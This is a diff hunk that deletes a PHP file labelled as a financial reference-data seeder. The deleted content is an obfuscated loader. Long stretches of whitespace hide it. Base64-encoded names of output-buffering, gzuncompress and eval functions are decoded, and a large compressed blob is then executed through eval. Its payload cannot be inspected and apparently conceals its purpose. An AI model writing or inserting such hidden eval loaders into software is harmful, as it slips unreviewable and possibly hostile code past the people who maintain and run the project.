@@ -1,713 +1,1242 @@
-<?php 
-        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/KeuanganManualRefKegiatan.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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